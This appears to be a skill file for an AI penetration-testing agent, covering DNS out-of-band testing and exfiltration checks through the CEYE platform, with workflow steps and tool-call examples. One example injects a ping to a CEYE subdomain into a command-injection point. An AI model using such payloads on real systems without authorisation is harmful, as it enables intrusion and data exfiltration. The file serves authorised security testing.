---
name: dns-oob
description: DNS out-of-band (OOB) reflection / exfiltration via CEYE platform. Use when the operator asks for DNS OOB testing, out-of-band data exfiltration, blind injection verification via DNS, or CEYE record queries.
activation: auto
version: "1.0"
tags: [oob, dns, exfiltration]
requires_tools:
  - list_skill_scripts
  - run_skill_script
env_required:
  - CEYE_API_TOKEN
when_to_use: "When the operator asks for DNS OOB testing, blind injection verification, or CEYE record queries."
---

# DNS OOB (CEYE)

Use this skill for DNS out-of-band interaction testing through the CEYE platform.

## What is CEYE

CEYE is a DNS/HTTP OOB interaction monitoring platform. You can trigger DNS queries from the target (e.g. via blind injection) and then query CEYE to confirm whether the queries were received.

## Workflow

1. Call `list_skill_scripts(skill_name="dns-oob")` to confirm available scripts.
2. Before querying, run `scripts/ceye_query.py` through `run_skill_script` to verify connectivity.
3. When you need to verify whether a DNS OOB payload was triggered, call `ceye_query.py` with the appropriate filter.
4. Always include the random identifier subdomain you used in the payload as the `filter` parameter.

## Usage Examples

### Check DNS records (no filter)

```
run_skill_script(skill_name="dns-oob", script_name="ceye_query.py", args_json='["--type","dns"]')
```

### Check DNS records with a filter

```
run_skill_script(skill_name="dns-oob", script_name="ceye_query.py", args_json='["--type","dns","--filter","abc123"]')
```

### Check HTTP request records

```
run_skill_script(skill_name="dns-oob", script_name="ceye_query.py", args_json='["--type","http","--filter","abc123"]')
```

## OOB Payload Format

The CEYE DNS subdomain format is:

```
{subdomain}.ceye.io
```

`{subdomain}` is your CEYE platform identifier (configured via `CEYE_SUBDOMAIN` in `.env`).

For example, if `CEYE_SUBDOMAIN=abcdef123`, inject `ping -c1 abcdef123.ceye.io` into a command injection. The target will resolve this DNS query. Then query CEYE records to confirm.

If you need to distinguish multiple tests, you can prepend a random prefix: `{random}.{subdomain}.ceye.io`, and use `--filter {random}` to filter results.

## Notes

- The CEYE API token is stored in the `CEYE_API_TOKEN` environment variable (configured in `.env`).
- The CEYE subdomain identifier is stored in the `CEYE_SUBDOMAIN` environment variable (configured in `.env`).
- The `--filter` parameter matches subdomain prefixes. Max length is 20 characters.
- Use unique, random identifiers for each test to avoid cross-contamination.
- DNS propagation may take a few seconds; wait 3-5 seconds before querying.
- This skill is for **verification only** — use it to confirm that an OOB interaction occurred.
- Always document findings via `record_finding` when an OOB interaction is confirmed.
